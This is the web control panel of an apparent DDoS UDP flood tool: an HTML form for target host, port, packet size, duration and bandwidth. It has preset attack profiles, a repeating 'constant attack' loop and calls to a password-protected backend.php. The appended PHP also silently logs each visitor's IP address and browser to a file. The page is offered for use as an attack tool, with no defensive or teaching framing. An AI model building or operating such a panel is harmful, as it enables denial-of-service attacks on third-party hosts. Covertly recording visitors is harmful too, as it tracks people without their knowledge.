<!DOCTYPE html>
<html>
<head>
	<title>DDoS UDP Flood</title>
	<meta http-equiv="content-type" content="text/html;charset=utf-8" />
	<meta name="generator" content="Geany 1.23.1" />
	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
	<!-- https://getmdl.io/ -->
	<link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.indigo-pink.min.css">
	<script defer src="https://code.getmdl.io/1.3.0/material.min.js"></script>
	<script>
	// microAjax - https://github.com/TheZ3ro/microajax/
	function microAjax(B,A){this.bindFunction=function(E,D){return function(){return E.apply(D,[D])}};this.stateChange=function(D){if(this.request.readyState==4){this.callbackFunction(this.request.responseText)}};this.getRequest=function(){if(window.ActiveXObject){return new ActiveXObject("Microsoft.XMLHTTP")}else{if(window.XMLHttpRequest){return new XMLHttpRequest()}}return false};this.postBody=(arguments[2]||"");this.callbackFunction=A;this.url=B;this.request=this.getRequest();if(this.request){var C=this.request;C.onreadystatechange=this.bindFunction(this.stateChange,this);if(this.postBody!==""){C.open("POST",B,true);C.setRequestHeader("X-Requested-With","XMLHttpRequest");C.setRequestHeader("Content-type","application/x-www-form-urlencoded");C.setRequestHeader("Connection","close")}else{C.open("GET",B,true)}C.send(this.postBody)}};
	</script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0-beta/js/materialize.min.js"></script>
</head>
<body style='font-family="sans-serif"'>
	<center>
		<div id="ddos" style="padding: 5px;">
			<br/>
			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
			    <input class="mdl-textfield__input" type="text" id="host">
			    <label class="mdl-textfield__label" for="host">Host (Example: <?php echo getUserIP(); ?>)</label>
				<span class="mdl-textfield__error">A Host is required</span>
			 </div>
			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
				<input class="mdl-textfield__input" type="text" pattern="-?[0-9]*(\.[0-9]+)?" id="port">
				<label class="mdl-textfield__label" for="port">Port (Example: 80)</label>
				<span class="mdl-textfield__error">Input is not a number!</span>
			</div>
			<br/>
			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
			    <input class="mdl-textfield__input" type="text" pattern="-?[0-9]*(\.[0-9]+)?" id="packet">
			    <label class="mdl-textfield__label" for="packet">Packet (Example: 5000)</label>
				<span class="mdl-textfield__error">Input is not a number!</span>
			</div>
			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
			    <input class="mdl-textfield__input" type="text" pattern="-?[0-9]*(\.[0-9]+)?" id="time">
			    <label class="mdl-textfield__label" for="time">Time (Example: 60 (In seconds))</label>
				<span class="mdl-textfield__error">Input is not a number!</span>
			</div>
			<br/>
			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
			    <input class="mdl-textfield__input" type="text" pattern="-?[0-9]*(\.[0-9]+)?" id="bytes">
			    <label class="mdl-textfield__label" for="bytes">Bytes (Example: 65000)</label>
				<span class="mdl-textfield__error">Input is not a number!</span>
			</div>
			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
			    <input class="mdl-textfield__input" type="text" pattern="-?[0-9]*(\.[0-9]+)?" id="interval">
			    <label class="mdl-textfield__label" for="interval">Interval (Example: 5)</label>
				<span class="mdl-textfield__error">Input is not a number!</span>
			</div>
			<br/>
			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
			    <input class="mdl-textfield__input" type="text" pattern="-?[0-9]*(\.[0-9]+)?" id="bandwidth">
			    <label class="mdl-textfield__label" for="pass">Bandwitdh (Example: 1 (~1MB))</label>
				<span class="mdl-textfield__error">Input is not a number!</span>
			</div>
			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
			    <input class="mdl-textfield__input" type="text" id="pass">
			    <label class="mdl-textfield__label" for="pass">Password</label>
				<span class="mdl-textfield__error">Password is required</span>
			</div>

			<br/>
			<br/>
			<div>
				<button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent" id="loadLag" onClick="javascript:lagConfig();">Lag config</button>
				<button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent" id="loadTraffic" onClick="javascript:trafficConfig();">Traffic config</button>
				<button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent" id="loadFuckIt" onClick="javascript:fuckItConfig();">Fuck It Config</button>
			</div>
			<br/>
			<div>
				<button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent" id="send" onClick="javascript:fire();">Execute</button>
			</div>
			<br/>
			<label>Constant attack with smart delays</label>
			<button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent" id="sendWithInterval" onClick="javascript:constantAttack(true);">Start</button>
			<button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent" id="stopInterval" disabled="true" onClick="javascript:constantAttack(false);">Stop</button>
			<br/>
			<div class="mdl-spinner mdl-spinner--single-color mdl-js-spinner" id="spinner"></div>
			<br/>
			<div class="mdl-textfield mdl-js-textfield">
				<textarea class="mdl-textfield__input" type="text" rows="10" cols="50" id="log" style='width: auto;'></textarea>
			</div>
		</div>
	</center>
	<script>
		var _log=document.getElementById("log");
		var intervalHandler = null;
		function fire(){
			var host=document.getElementById("host").value;
			var port=document.getElementById("port").value;
			var packet=document.getElementById("packet").value;
			var time=document.getElementById("time").value;
			var pass=document.getElementById("pass").value;
			var bytes=document.getElementById("bytes").value;
			var bandwidth=document.getElementById("bandwidth").value;
			var interval=document.getElementById("interval").value;
			
			
			if(host!="" && pass!=""){
				inputLock(true);
				var url='./backend.php?pass='+pass+'&host='+host+(port!=""? '&port='+port:'')+(bandwidth!=""? '&bandwidth='+bandwidth:'')+(time!=""? '&time='+time:'')+(packet!=""? '&packet='+packet:'')+(bytes!=""? '&bytes='+bytes:'')+(interval!=""? '&interval='+interval:'');
				console.log(url);
				microAjax(url, function(result) { 
					_log.value=result;
					if(_log.value.includes("Wrong password")){
						constantAttack(false);
					}
					if(intervalHandler == null){
						inputLock(false);
					}
				});
			}
			else{
				passIsNotEmpty();
				hostIsNotEmpty();
			}
		}

		function passIsNotEmpty() {
			var pass=document.getElementById("pass").value;
			if(pass == ""){
				document.getElementById("pass").parentElement.classList.add("is-invalid");
			}
		}

		function hostIsNotEmpty() {
			var host=document.getElementById("host").value;
			if(host == ""){
				document.getElementById("host").parentElement.classList.add("is-invalid");
			}
		}

		function dirtyConfiger(){
			document.getElementById("time").parentElement.classList.add("is-dirty");
			document.getElementById("bytes").parentElement.classList.add("is-dirty");
			document.getElementById("interval").parentElement.classList.add("is-dirty");
		}
		
		function lagConfig(){
			dirtyConfiger();
			packet=document.getElementById("packet").value = "";
			time=document.getElementById("time").value = "10";
			bytes=document.getElementById("bytes").value = "1";
			interval=document.getElementById("interval").value = "0";
		}
		
		function trafficConfig(){
			dirtyConfiger();
			packet=document.getElementById("packet").value = "";
			time=document.getElementById("time").value = "5";
			bytes=document.getElementById("bytes").value = "65000";
			interval=document.getElementById("interval").value = "10";
		}
		
		function fuckItConfig(){
			dirtyConfiger();
			packet=document.getElementById("packet").value = "";
			time=document.getElementById("time").value = "120";
			bytes=document.getElementById("bytes").value = "65000";
			interval=document.getElementById("interval").value = "2";
		}
		
		function constantAttack(status){
			var host=document.getElementById("host").value;
			var host=document.getElementById("pass").value;
			var intervalTime=(document.getElementById("time").value * 1000) + 1000;
			if(host!="" && pass!=""){
				if(status == true){
					fire();
					inputLock(true);
					intervalHandler = setInterval(fire,intervalTime);
				}
				else if(status == false){
					clearInterval(intervalHandler);
					inputLock(false);
					intervalHandler = null;
				}
			}
			else{
				_log.value = "Not all required parameters are filled correctly!"
			}
		}
		
		function inputLock(status){
			var inputs = document.getElementsByTagName("input");
			var buttons = document.getElementsByTagName("button");
			if(status == true){
				for(i = 0;i < inputs.length;i++)
				{
					inputs[i].disabled = true;
				}
				for(i = 0;i < buttons.length;i++)
				{
					buttons[i].disabled = true;
				}
				document.getElementById("stopInterval").disabled = false;
				document.getElementById("spinner").classList.add("is-active");
			}
			else{
				for(i = 0;i < inputs.length;i++)
				{
					inputs[i].disabled = false;
				}
				for(i = 0;i < buttons.length;i++)
				{
					buttons[i].disabled = false;
				}
				document.getElementById("stopInterval").disabled = true;
				document.getElementById("spinner").classList.remove("is-active");
			}
		}
	</script>
</body>
</html>

<?php
$ip = getUserIP();
$browser = $_SERVER['HTTP_USER_AGENT'];
$dateTime = date('Y/m/d G:i:s');
$file = "visitors.html";
$file = fopen($file, "a");
$data = "<pre><b>User IP</b>: $ip <b> Browser</b>: $browser <br>on Time : $dateTime <br></pre>";
fwrite($file, $data);
fclose($file);


function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
?>
